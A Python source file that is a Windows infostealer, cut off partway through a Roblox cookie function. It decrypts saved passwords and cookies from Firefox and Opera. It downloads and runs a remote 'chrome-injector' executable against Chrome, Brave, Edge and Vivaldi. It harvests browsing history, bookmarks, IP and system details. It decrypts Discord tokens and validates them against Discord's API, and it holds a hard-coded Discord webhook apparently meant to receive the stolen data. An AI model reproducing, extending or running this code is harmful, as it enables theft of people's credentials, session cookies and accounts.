import os
import subprocess
import tempfile
import zipfile
import shutil
import requests
import json
import sqlite3
import base64
import time
import ctypes as ct
from ctypes import c_char_p, c_void_p, c_uint, POINTER, Structure, cast, byref, string_at
from getpass import getpass
import websocket
import win32crypt
from Crypto.Cipher import AES
import re
import datetime
import platform
from pathlib import Path
import random
import string
from datetime import timedelta

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import wmi
    WMI_AVAILABLE = True
except ImportError:
    WMI_AVAILABLE = False

try:
    import GPUtil
    GPU_AVAILABLE = True
except ImportError:
    GPU_AVAILABLE = False

def get_random_temp_dir():
    return os.path.join(tempfile.gettempdir(), ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)))

BASE_OUTPUT_DIR = get_random_temp_dir()
BROWSERS_DIR = os.path.join(BASE_OUTPUT_DIR, "browsers")

WEBHOOK_URL = "https://discord.com/api/webhooks/1492714259875102921/LYRqhdZQ9TAOrGbKlxIrKS5apG-v0gB2Bw4ni7uRFn_JnThHZTpxXgefWcBTBu1NXBlq"

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
TEMP_MAIN = tempfile.gettempdir()

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

OPERA_PATH = os.path.join(LOCAL, "Programs", "Opera", "opera.exe")
OPERA_GX_PATH = os.path.join(LOCAL, "Programs", "Opera GX", "opera.exe")
OPERA_PROFILE = os.path.join(ROAMING, "Opera Software", "Opera Stable")
OPERA_GX_PROFILE = os.path.join(ROAMING, "Opera Software", "Opera GX Stable")

ZIP_URL = "https://github.com/Xander764/stuff/releases/download/hacks/chrome-injector-v0.20.0.zip"

class SECItem(Structure):
    _fields_ = [("type", c_uint), ("data", c_char_p), ("len", c_uint)]

def find_nss_dll():
    locations = [
        r"C:\Program Files\Mozilla Firefox",
        r"C:\Program Files (x86)\Mozilla Firefox",
        os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox"),
        os.getcwd(),
    ]
    for loc in locations:
        nss_path = os.path.join(loc, "nss3.dll")
        if os.path.exists(nss_path):
            return nss_path, loc
    return None, None

def load_nss():
    nss_path, nss_dir = find_nss_dll()
    if not nss_path:
        return None

    old_path = os.environ.get('PATH', '')
    os.environ['PATH'] = nss_dir + ';' + old_path
    old_cwd = os.getcwd()
    os.chdir(nss_dir)

    nss = ct.CDLL(nss_path)

    nss.NSS_Init.argtypes = [c_char_p]
    nss.NSS_Init.restype = ct.c_int

    nss.NSS_Shutdown.argtypes = []
    nss.NSS_Shutdown.restype = ct.c_int

    nss.PK11_GetInternalKeySlot.argtypes = []
    nss.PK11_GetInternalKeySlot.restype = c_void_p

    nss.PK11_FreeSlot.argtypes = [c_void_p]
    nss.PK11_FreeSlot.restype = None

    nss.PK11_NeedLogin.argtypes = [c_void_p]
    nss.PK11_NeedLogin.restype = ct.c_int

    nss.PK11_CheckUserPassword.argtypes = [c_void_p, c_char_p]
    nss.PK11_CheckUserPassword.restype = ct.c_int

    nss.PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]
    nss.PK11SDR_Decrypt.restype = ct.c_int

    nss.SECITEM_ZfreeItem.argtypes = [POINTER(SECItem), ct.c_int]
    nss.SECITEM_ZfreeItem.restype = None

    os.chdir(old_cwd)
    return nss

def decrypt_data(nss, encrypted_b64):
    encrypted = base64.b64decode(encrypted_b64)
    inp = SECItem(0, cast(encrypted, c_char_p), len(encrypted))
    out = SECItem(0, None, 0)

    result = nss.PK11SDR_Decrypt(byref(inp), byref(out), None)

    if result == 0:
        decrypted = string_at(out.data, out.len).decode('utf-8', errors='replace')
        nss.SECITEM_ZfreeItem(byref(out), 0)
        return decrypted
    return None

def get_firefox_profiles():
    profiles_ini = os.path.join(ROAMING, 'Mozilla', 'Firefox', 'profiles.ini')
    if not os.path.exists(profiles_ini):
        return []

    profiles = []
    with open(profiles_ini, 'r') as f:
        for line in f:
            if line.startswith('Path='):
                path = line.split('=')[1].strip()
                full_path = os.path.join(ROAMING, 'Mozilla', 'Firefox', path.replace('/', os.sep))
                if os.path.exists(full_path):
                    profiles.append(full_path)
    return profiles

def extract_firefox_cookies(profile_path):
    cookies_db = os.path.join(profile_path, 'cookies.sqlite')
    if not os.path.exists(cookies_db):
        return []

    temp_db = tempfile.mktemp(suffix='.db')
    shutil.copy2(cookies_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host, name, value FROM moz_cookies")
    cookies = cursor.fetchall()

    conn.close()
    os.unlink(temp_db)
    return cookies

def extract_firefox_passwords(profile_path, nss):
    logins_file = os.path.join(profile_path, 'logins.json')
    if not os.path.exists(logins_file):
        return []

    profile_db = "sql:" + profile_path
    if nss.NSS_Init(profile_db.encode()) != 0:
        return []

    slot = nss.PK11_GetInternalKeySlot()
    if not slot:
        nss.NSS_Shutdown()
        return []

    need_login = nss.PK11_NeedLogin(slot)

    if need_login:
        nss.PK11_FreeSlot(slot)
        nss.NSS_Shutdown()
        return []

    with open(logins_file, 'r') as f:
        data = json.load(f)

    passwords = []
    for entry in data.get('logins', []):
        enc_user = entry.get('encryptedUsername', '')
        enc_pass = entry.get('encryptedPassword', '')

        if enc_user and enc_pass:
            user = decrypt_data(nss, enc_user)
            pwd = decrypt_data(nss, enc_pass)
            if user and pwd:
                passwords.append({
                    'url': entry.get('hostname', ''),
                    'username': user,
                    'password': pwd
                })

    nss.PK11_FreeSlot(slot)
    nss.NSS_Shutdown()
    return passwords

def run_firefox_extraction():
    nss = load_nss()
    if not nss:
        return

    profile_paths = get_firefox_profiles()
    if not profile_paths:
        return

    firefox_output_dir = os.path.join(BROWSERS_DIR, "firefox")
    has_data = False

    for profile_path in profile_paths:
        profile_name = os.path.basename(profile_path)
        profile_out = os.path.join(firefox_output_dir, profile_name)

        cookies = extract_firefox_cookies(profile_path)
        passwords = extract_firefox_passwords(profile_path, nss)

        if cookies or passwords:
            has_data = True
            os.makedirs(profile_out, exist_ok=True)

            if cookies:
                with open(os.path.join(profile_out, "cookies.txt"), "w") as f:
                    for host, name, value in cookies:
                        f.write(f"{host}\t{name}\t{value}\n")

            if passwords:
                with open(os.path.join(profile_out, "passwords.txt"), "w") as f:
                    for p in passwords:
                        f.write(f"{p['url']}\t{p['username']}\t{p['password']}\n")

    if not has_data and os.path.exists(firefox_output_dir):
        shutil.rmtree(firefox_output_dir)

def kill_opera():
    subprocess.run(["taskkill", "/F", "/IM", "opera.exe"], capture_output=True)
    time.sleep(1)

def get_opera_master_key(profile_path):
    local_state_path = os.path.join(profile_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_opera_value(encrypted_value, master_key):
    if not master_key or not encrypted_value or len(encrypted_value) < 15:
        return None
    nonce = encrypted_value[3:15]
    ciphertext_and_tag = encrypted_value[15:]
    if len(ciphertext_and_tag) < 16:
        return None
    tag = ciphertext_and_tag[-16:]
    ciphertext = ciphertext_and_tag[:-16]
    try:
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8', errors='ignore')
    except:
        return None

def extract_opera_passwords(profile_path, master_key):
    login_db = os.path.join(profile_path, "Default", "Login Data")
    if not os.path.exists(login_db):
        return []

    temp_fd, temp_db = tempfile.mkstemp(suffix='.db')
    os.close(temp_fd)
    shutil.copy2(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    conn.text_factory = bytes
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    passwords = []
    for url_bytes, username_bytes, pass_enc in cursor.fetchall():
        url = url_bytes.decode('utf-8', errors='ignore') if url_bytes else ""
        username = username_bytes.decode('utf-8', errors='ignore') if username_bytes else ""

        if pass_enc:
            password = decrypt_opera_value(pass_enc, master_key)
            if password:
                passwords.append({
                    'url': url,
                    'username': username,
                    'password': password
                })

    cursor.close()
    conn.close()
    os.unlink(temp_db)

    return passwords

def extract_opera_cookies_cdp(browser_path, profile_path):
    kill_opera()

    proc = subprocess.Popen([
        browser_path,
        f"--user-data-dir={profile_path}",
        "--remote-debugging-port=9222",
        "--remote-allow-origins=*",
        "--headless=new",
        "--no-first-run"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

    time.sleep(5)

    cookies = []
    try:
        response = requests.get("http://localhost:9222/json", timeout=10)
        tabs = response.json()

        if not tabs:
            return cookies

        ws_url = tabs[0]['webSocketDebuggerUrl']
        ws = websocket.create_connection(ws_url, timeout=10)

        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        result = json.loads(ws.recv())
        ws.close()

        cookies = result.get('result', {}).get('cookies', [])

    except Exception:
        pass
    finally:
        proc.terminate()
        time.sleep(1)
        subprocess.run(["taskkill", "/F", "/IM", "opera.exe"], capture_output=True)

    return cookies

def run_opera_extraction():
    opera_configs = [
        (OPERA_PATH, OPERA_PROFILE, "Opera"),
        (OPERA_GX_PATH, OPERA_GX_PROFILE, "Opera_GX")
    ]

    for browser_path, profile_path, browser_name in opera_configs:
        if not os.path.exists(browser_path) or not os.path.exists(profile_path):
            continue

        master_key = get_opera_master_key(profile_path)
        if not master_key:
            continue

        output_dir = os.path.join(BROWSERS_DIR, browser_name)
        os.makedirs(output_dir, exist_ok=True)

        cookies = extract_opera_cookies_cdp(browser_path, profile_path)
        if cookies:
            with open(os.path.join(output_dir, "cookies.txt"), "w", encoding='utf-8') as f:
                for cookie in cookies:
                    f.write(f"Domain: {cookie.get('domain', '')}\n")
                    f.write(f"Name: {cookie.get('name', '')}\n")
                    f.write(f"Value: {cookie.get('value', '')}\n")
                    f.write(f"Secure: {cookie.get('secure', False)}\n")
                    f.write(f"HttpOnly: {cookie.get('httpOnly', False)}\n")
                    f.write("-" * 50 + "\n")

        passwords = extract_opera_passwords(profile_path, master_key)
        if passwords:
            with open(os.path.join(output_dir, "passwords.txt"), "w", encoding='utf-8') as f:
                for pwd in passwords:
                    f.write(f"URL: {pwd['url']}\n")
                    f.write(f"Username: {pwd['username']}\n")
                    f.write(f"Password: {pwd['password']}\n")
                    f.write("-" * 50 + "\n")

def get_chromium_history(history_path):
    if not os.path.exists(history_path):
        return []

    temp_db = os.path.join(TEMP_MAIN, f'history_temp_{os.getpid()}.db')
    try:
        shutil.copy2(history_path, temp_db)
    except:
        return []

    history = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT urls.url, urls.title, urls.last_visit_time, urls.visit_count
            FROM urls WHERE url IS NOT NULL
            ORDER BY urls.last_visit_time DESC LIMIT 5000
        """)
        for row in cursor.fetchall():
            url, title, timestamp, visit_count = row
            if url and timestamp:
                try:
                    dt = datetime.datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
                    date_str = dt.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    date_str = "Unknown"
                history.append({
                    'title': title or '(No title)',
                    'url': url,
                    'last_visit': date_str,
                    'visit_count': visit_count
                })
        conn.close()
    except:
        pass
    try:
        os.unlink(temp_db)
    except:
        pass
    return history

def get_chromium_bookmarks(bookmarks_path):
    if not os.path.exists(bookmarks_path):
        return []

    temp_json = os.path.join(TEMP_MAIN, f'bookmarks_temp_{os.getpid()}.json')
    try:
        shutil.copy2(bookmarks_path, temp_json)
    except:
        return []

    bookmarks = []
    try:
        with open(temp_json, 'r', encoding='utf-8') as f:
            data = json.load(f)
        def extract_bookmarks(node, folder_path=""):
            if 'children' in node:
                for child in node['children']:
                    if child.get('type') == 'url':
                        bookmarks.append({
                            'name': child.get('name', ''),
                            'url': child.get('url', ''),
                            'folder': folder_path if folder_path else 'Root'
                        })
                    elif child.get('type') == 'folder':
                        new_path = f"{folder_path}/{child.get('name', '')}" if folder_path else child.get('name', '')
                        extract_bookmarks(child, new_path)
        roots = data.get('roots', {})
        for root_name, root_node in roots.items():
            if root_name in ['bookmark_bar', 'other', 'synced']:
                extract_bookmarks(root_node, root_name)
    except:
        pass
    try:
        os.unlink(temp_json)
    except:
        pass
    return bookmarks

def get_firefox_history_bookmarks(profile_path):
    places_db = os.path.join(profile_path, 'places.sqlite')
    if not os.path.exists(places_db):
        return [], []

    temp_db = os.path.join(TEMP_MAIN, f'firefox_places_{os.getpid()}.db')
    try:
        shutil.copy2(places_db, temp_db)
    except:
        return [], []

    history = []
    bookmarks = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT url, title, last_visit_date, visit_count
            FROM moz_places
            WHERE last_visit_date IS NOT NULL AND url IS NOT NULL
            ORDER BY last_visit_date DESC LIMIT 5000
        """)
        for row in cursor.fetchall():
            url, title, timestamp, visit_count = row
            if url and timestamp:
                try:
                    dt = datetime.datetime.fromtimestamp(timestamp / 1000000)
                    date_str = dt.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    date_str = "Unknown"
                history.append({
                    'title': title or '(No title)',
                    'url': url,
                    'last_visit': date_str,
                    'visit_count': visit_count
                })
        cursor.execute("""
            SELECT b.title, p.url, parent.title as folder
            FROM moz_bookmarks b
            JOIN moz_places p ON b.fk = p.id
            LEFT JOIN moz_bookmarks parent ON b.parent = parent.id
            WHERE b.type = 1 AND p.url IS NOT NULL
        """)
        for row in cursor.fetchall():
            title, url, folder = row
            if url:
                bookmarks.append({
                    'name': title or '',
                    'url': url,
                    'folder': folder or 'Unsorted'
                })
        conn.close()
    except:
        pass
    try:
        os.unlink(temp_db)
    except:
        pass
    return history, bookmarks

def run_chromium_history_bookmarks():
    chromium_browsers = [
        ('Chrome', os.path.join(LOCAL, r'Google\Chrome\User Data\Default')),
        ('Brave', os.path.join(LOCAL, r'BraveSoftware\Brave-Browser\User Data\Default')),
        ('Edge', os.path.join(LOCAL, r'Microsoft\Edge\User Data\Default')),
    ]
    for browser_name, profile_dir in chromium_browsers:
        if not os.path.exists(profile_dir):
            continue
        history_path = os.path.join(profile_dir, 'History')
        bookmarks_path = os.path.join(profile_dir, 'Bookmarks')
        browser_output = os.path.join(BROWSERS_DIR, browser_name)
        os.makedirs(browser_output, exist_ok=True)
        history = get_chromium_history(history_path)
        if history:
            with open(os.path.join(browser_output, 'history.txt'), 'w', encoding='utf-8') as f:
                for entry in history:
                    f.write(f"Title: {entry['title']}\n")
                    f.write(f"URL: {entry['url']}\n")
                    f.write(f"Last Visit: {entry['last_visit']}\n")
                    f.write(f"Visit Count: {entry['visit_count']}\n")
                    f.write("-" * 60 + "\n")
        bookmarks = get_chromium_bookmarks(bookmarks_path)
        if bookmarks:
            with open(os.path.join(browser_output, 'bookmarks.txt'), 'w', encoding='utf-8') as f:
                for entry in bookmarks:
                    f.write(f"Name: {entry['name']}\n")
                    f.write(f"URL: {entry['url']}\n")
                    f.write(f"Folder: {entry['folder']}\n")
                    f.write("-" * 60 + "\n")

def run_firefox_history_bookmarks():
    firefox_profiles = get_firefox_profiles()
    if not firefox_profiles:
        return
    firefox_output = os.path.join(BROWSERS_DIR, 'Firefox')
    for profile_path in firefox_profiles:
        profile_name = os.path.basename(profile_path)
        profile_output = os.path.join(firefox_output, profile_name)
        history, bookmarks = get_firefox_history_bookmarks(profile_path)
        if history or bookmarks:
            os.makedirs(profile_output, exist_ok=True)
            if history:
                with open(os.path.join(profile_output, 'history.txt'), 'w', encoding='utf-8') as f:
                    for entry in history:
                        f.write(f"Title: {entry['title']}\n")
                        f.write(f"URL: {entry['url']}\n")
                        f.write(f"Last Visit: {entry['last_visit']}\n")
                        f.write(f"Visit Count: {entry['visit_count']}\n")
                        f.write("-" * 60 + "\n")
            if bookmarks:
                with open(os.path.join(profile_output, 'bookmarks.txt'), 'w', encoding='utf-8') as f:
                    for entry in bookmarks:
                        f.write(f"Name: {entry['name']}\n")
                        f.write(f"URL: {entry['url']}\n")
                        f.write(f"Folder: {entry['folder']}\n")
                        f.write("-" * 60 + "\n")

def run_opera_history_bookmarks():
    opera_configs = [
        ('Opera', os.path.join(ROAMING, r'Opera Software\Opera Stable\Default')),
        ('Opera_GX', os.path.join(ROAMING, r'Opera Software\Opera GX Stable\Default')),
    ]
    for browser_name, profile_dir in opera_configs:
        if not os.path.exists(profile_dir):
            continue
        history_path = os.path.join(profile_dir, 'History')
        bookmarks_path = os.path.join(profile_dir, 'Bookmarks')
        browser_output = os.path.join(BROWSERS_DIR, browser_name)
        os.makedirs(browser_output, exist_ok=True)
        history = get_chromium_history(history_path)
        if history:
            with open(os.path.join(browser_output, 'history.txt'), 'w', encoding='utf-8') as f:
                for entry in history:
                    f.write(f"Title: {entry['title']}\n")
                    f.write(f"URL: {entry['url']}\n")
                    f.write(f"Last Visit: {entry['last_visit']}\n")
                    f.write(f"Visit Count: {entry['visit_count']}\n")
                    f.write("-" * 60 + "\n")
        bookmarks = get_chromium_bookmarks(bookmarks_path)
        if bookmarks:
            with open(os.path.join(browser_output, 'bookmarks.txt'), 'w', encoding='utf-8') as f:
                for entry in bookmarks:
                    f.write(f"Name: {entry['name']}\n")
                    f.write(f"URL: {entry['url']}\n")
                    f.write(f"Folder: {entry['folder']}\n")
                    f.write("-" * 60 + "\n")

def run_xaitax_extractor():
    temp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(temp_dir, "injector.zip")

    response = requests.get(ZIP_URL)
    with open(zip_path, 'wb') as f:
        f.write(response.content)

    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(temp_dir)

    exe_path = None
    for file in os.listdir(temp_dir):
        if file.endswith(".exe") and "arm64" not in file.lower():
            exe_path = os.path.join(temp_dir, file)
            break

    chrome_dir = "C:\\Program Files\\Google\\Chrome\\Application"
    chrome_data_path = os.path.join(LOCAL, r"Google\Chrome\User Data")
    
    if os.path.exists(chrome_dir) and os.path.exists(chrome_data_path):
        profiles = ["Default"]
        for entry in os.listdir(chrome_data_path):
            if entry.startswith("Profile "):
                profiles.append(entry)
        
        for profile in profiles:
            profile_folder = profile.replace(" ", "_")
            output_dir = os.path.join(BROWSERS_DIR, "Chrome", profile_folder)
            os.makedirs(output_dir, exist_ok=True)
            
            subprocess.run(
                f'cd /d "{chrome_dir}" && "{exe_path}" -o "{output_dir}" chrome',
                shell=True, capture_output=True, timeout=120
            )
            
            if os.path.exists(output_dir):
                has_files = False
                for root, dirs, files in os.walk(output_dir):
                    if files:
                        has_files = True
                        break
                if not has_files:
                    shutil.rmtree(output_dir)

    browsers = [
        ("chrome beta", "Chrome_Beta", "C:\\Program Files\\Google\\Chrome Beta\\Application"),
        ("brave", "Brave", "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application"),
        ("edge", "Edge", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application"),
        ("avast", "Avast", ""),
        ("vivaldi", "Vivaldi", "C:\\Program Files\\Vivaldi\\Application"),
    ]

    for browser_cmd, browser_folder, browser_dir in browsers:
        output_dir = os.path.join(BROWSERS_DIR, browser_folder)
        os.makedirs(output_dir, exist_ok=True)

        if browser_dir and os.path.exists(browser_dir):
            subprocess.run(
                f'cd /d "{browser_dir}" && "{exe_path}" -o "{output_dir}" {browser_cmd}',
                shell=True, capture_output=True, timeout=120
            )
        else:
            subprocess.run(
                f'"{exe_path}" -o "{output_dir}" {browser_cmd}',
                shell=True, capture_output=True, timeout=120
            )

        if os.path.exists(output_dir):
            has_files = False
            for root, dirs, files in os.walk(output_dir):
                if files:
                    has_files = True
                    break
            if not has_files:
                shutil.rmtree(output_dir)

    shutil.rmtree(temp_dir)

def get_ip_info():
    try:
        response = requests.get('https://ipwho.is/', timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                ip_info = {
                    'IP': data.get('ip', 'Unknown'),
                    'Country': data.get('country', 'Unknown'),
                    'City': data.get('city', 'Unknown'),
                    'ISP': data.get('connection', {}).get('isp', 'Unknown'),
                    'VPN': str(data.get('security', {}).get('vpn', 'Unknown')),
                }
                return ip_info
        return None
    except Exception:
        return None

class TaskManagerPerformance:
    def __init__(self):
        self.system = platform.system()
        self.wmi_obj = None
        if WMI_AVAILABLE and self.system == "Windows":
            try:
                self.wmi_obj = wmi.WMI()
            except:
                pass

    def get_cpu_metrics(self):
        cpu_data = {
            "Name": "Unknown",
            "Usage": f"{psutil.cpu_percent(interval=0.5)}%",
            "Cores": str(psutil.cpu_count(logical=False)),
            "LogicalProcessors": str(psutil.cpu_count(logical=True))
        }
        if psutil.cpu_freq():
            cpu_data["Speed"] = f"{psutil.cpu_freq().current:.0f} MHz"
        return cpu_data

    def get_memory_metrics(self):
        mem = psutil.virtual_memory()
        return {
            "Total": f"{mem.total / (1024**3):.1f} GB",
            "InUse": f"{mem.used / (1024**3):.1f} GB",
            "Available": f"{mem.available / (1024**3):.1f} GB",
            "Usage": f"{mem.percent}%"
        }

    def get_disk_metrics(self):
        disks = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    "Name": partition.device,
                    "Total": f"{usage.total / (1024**3):.0f} GB",
                    "Used": f"{usage.used / (1024**3):.0f} GB",
                    "Free": f"{usage.free / (1024**3):.0f} GB",
                    "Usage": f"{usage.percent}%"
                })
            except PermissionError:
                continue
        return disks

    def get_network_metrics(self):
        network_data = {"WiFi": [], "Ethernet": []}
        net_if_stats = psutil.net_if_stats()
        net_if_addrs = psutil.net_if_addrs()

        for interface_name, stats in net_if_stats.items():
            interface_type = "WiFi" if any(x in interface_name.lower() for x in ['wlan', 'wi-fi', 'wireless', 'wifi']) else "Ethernet"

            ipv4 = "N/A"
            for addr in net_if_addrs.get(interface_name, []):
                if hasattr(addr.family, 'name') and addr.family.name == 'AF_INET':
                    ipv4 = addr.address
                elif str(addr.family) == '2':
                    ipv4 = addr.address

            interface_info = {
                "Name": interface_name,
                "IPAddress": ipv4,
                "LinkSpeed": f"{stats.speed} Mbps" if stats.speed > 0 else "N/A",
                "Status": "Up" if stats.isup else "Down"
            }

            if interface_type == "WiFi":
                network_data["WiFi"].append(interface_info)
            else:
                network_data["Ethernet"].append(interface_info)

        return network_data

    def get_gpu_metrics(self):
        gpu_data = []
        if self.wmi_obj:
            try:
                for gpu in self.wmi_obj.Win32_VideoController():
                    if gpu.Name and "Microsoft" not in str(gpu.Name):
                        gpu_data.append({"Name": gpu.Name.strip()})
            except:
                pass
        return gpu_data

    def get_all_performance_data(self):
        return {
            "Timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "CPU": self.get_cpu_metrics(),
            "Memory": self.get_memory_metrics(),
            "Disk": self.get_disk_metrics(),
            "Network": self.get_network_metrics(),
            "GPU": self.get_gpu_metrics()
        }

    def format_performance_text(self, data=None):
        if data is None:
            data = self.get_all_performance_data()

        lines = []
        lines.append("="*60)
        lines.append(f"SYSTEM INFORMATION - {data['Timestamp']}")
        lines.append("="*60)

        lines.append("\nCPU")
        lines.append("-" * 40)
        cpu = data['CPU']
        lines.append(f"  Name: {cpu.get('Name', 'Unknown')}")
        lines.append(f"  Usage: {cpu.get('Usage', 'Unknown')}")
        lines.append(f"  Speed: {cpu.get('Speed', 'Unknown')}")
        lines.append(f"  Cores: {cpu.get('Cores', 'Unknown')}")
        lines.append(f"  Logical Processors: {cpu.get('LogicalProcessors', 'Unknown')}")

        lines.append("\nMemory")
        lines.append("-" * 40)
        mem = data['Memory']
        lines.append(f"  Total: {mem.get('Total', 'Unknown')}")
        lines.append(f"  In Use: {mem.get('InUse', 'Unknown')}")
        lines.append(f"  Available: {mem.get('Available', 'Unknown')}")
        lines.append(f"  Usage: {mem.get('Usage', 'Unknown')}")

        lines.append("\nDisk")
        lines.append("-" * 40)
        for disk in data['Disk']:
            lines.append(f"  {disk['Name']}")
            lines.append(f"    Total: {disk['Total']}")
            lines.append(f"    Used: {disk['Used']}")
            lines.append(f"    Free: {disk['Free']}")
            lines.append(f"    Usage: {disk['Usage']}")

        lines.append("\nNetwork")
        lines.append("-" * 40)
        if data['Network']['WiFi']:
            for wifi in data['Network']['WiFi']:
                lines.append(f"  {wifi['Name']}")
                lines.append(f"    IP: {wifi['IPAddress']}")
                lines.append(f"    Speed: {wifi['LinkSpeed']}")
                lines.append(f"    Status: {wifi['Status']}")

        if data['Network']['Ethernet']:
            for eth in data['Network']['Ethernet']:
                lines.append(f"  {eth['Name']}")
                lines.append(f"    IP: {eth['IPAddress']}")
                lines.append(f"    Speed: {eth['LinkSpeed']}")
                lines.append(f"    Status: {eth['Status']}")

        lines.append("\nGPU")
        lines.append("-" * 40)
        if data['GPU']:
            for gpu in data['GPU']:
                lines.append(f"  {gpu['Name']}")
        else:
            lines.append("  No GPU detected")

        lines.append("\n" + "="*60)

        return '\n'.join(lines)

def get_discord_master_key(discord_path):
    local_state_path = os.path.join(discord_path, 'Local State')
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_discord_token(encrypted_token, master_key):
    try:
        if 'dQw4w9WgXcQ:' in encrypted_token:
            encrypted_token = encrypted_token.split('dQw4w9WgXcQ:')[1]
        encrypted_data = base64.b64decode(encrypted_token)
        iv = encrypted_data[3:15]
        payload = encrypted_data[15:]
        tag = payload[-16:]
        ciphertext = payload[:-16]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted_token = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        return decrypted_token
    except:
        return None

def get_discord_app_tokens():
    tokens_data = {}
    discord_paths = [
        ('Discord', os.path.join(ROAMING, 'discord')),
        ('Discord Canary', os.path.join(ROAMING, 'discordcanary')),
        ('Discord PTB', os.path.join(ROAMING, 'discordptb')),
    ]
    for app_name, discord_path in discord_paths:
        if not os.path.exists(discord_path):
            continue
        master_key = get_discord_master_key(discord_path)
        if not master_key:
            continue
        leveldb_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
        if not os.path.exists(leveldb_path):
            continue
        try:
            for file_name in os.listdir(leveldb_path):
                if not (file_name.endswith('.log') or file_name.endswith('.ldb')):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                try:
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                    encrypted_matches = re.findall(r'dQw4w9WgXcQ:([A-Za-z0-9+/=]{100,})', content)
                    for match in encrypted_matches:
                        try:
                            decrypted = decrypt_discord_token(match, master_key)
                            if decrypted and re.match(r'[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{27,38}', decrypted):
                                if decrypted not in tokens_data:
                                    tokens_data[decrypted] = f"DiscordApp_{app_name}"
                        except:
                            continue
                except:
                    continue
        except:
            continue
    return tokens_data

def scan_leveldb_for_tokens(path):
    tokens_found = {}
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith(('.ldb', '.log')):
                continue
            file_path = os.path.join(path, file_name)
            try:
                with open(file_path, 'rb') as f:
                    content = f.read().decode('utf-8', errors='ignore')
                token_pattern = r'[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38}'
                mfa_pattern = r'mfa\.[A-Za-z0-9_-]{84}'
                for match in re.findall(token_pattern, content):
                    if len(match) > 50 and match.count('.') >= 2:
                        tokens_found[match] = True
                for match in re.findall(mfa_pattern, content):
                    tokens_found[match] = True
            except:
                continue
    except:
        pass
    return tokens_found

def get_browser_discord_tokens():
    all_tokens = {}
    browser_paths = [
        (os.path.join(LOCAL, r'Google\Chrome\User Data'), 'Chrome'),
        (os.path.join(LOCAL, r'Microsoft\Edge\User Data'), 'Edge'),
        (os.path.join(LOCAL, r'BraveSoftware\Brave-Browser\User Data'), 'Brave'),
    ]

    for base_path, browser_name in browser_paths:
        if not os.path.exists(base_path):
            continue
        for profile in os.listdir(base_path):
            profile_path = os.path.join(base_path, profile)
            leveldb_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
            if os.path.exists(leveldb_path):
                tokens = scan_leveldb_for_tokens(leveldb_path)
                for token in tokens:
                    if token not in all_tokens:
                        all_tokens[token] = []
                    if f"{browser_name}_{profile}" not in all_tokens[token]:
                        all_tokens[token].append(f"{browser_name}_{profile}")

    return all_tokens

def validate_token(token):
    try:
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        if response.status_code == 200:
            user_data = response.json()
            user_id = user_data.get('id', 'Unknown')
            return True, user_id
        return False, None
    except:
        return False, None

def get_discord_tokens():
    all_valid_tokens = []
    app_tokens = get_discord_app_tokens()
    browser_tokens = get_browser_discord_tokens()

    all_tokens = {}
    for token, source in app_tokens.items():
        if token not in all_tokens:
            all_tokens[token] = []
        all_tokens[token].append(source)
    for token, sources in browser_tokens.items():
        if token not in all_tokens:
            all_tokens[token] = []
        for source in sources:
            if source not in all_tokens[token]:
                all_tokens[token].append(source)

    for token, sources in all_tokens.items():
        is_valid, user_id = validate_token(token)
        if is_valid:
            all_valid_tokens.append({
                'token': token,
                'user_id': user_id,
                'sources': sources
            })
    return all_valid_tokens

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
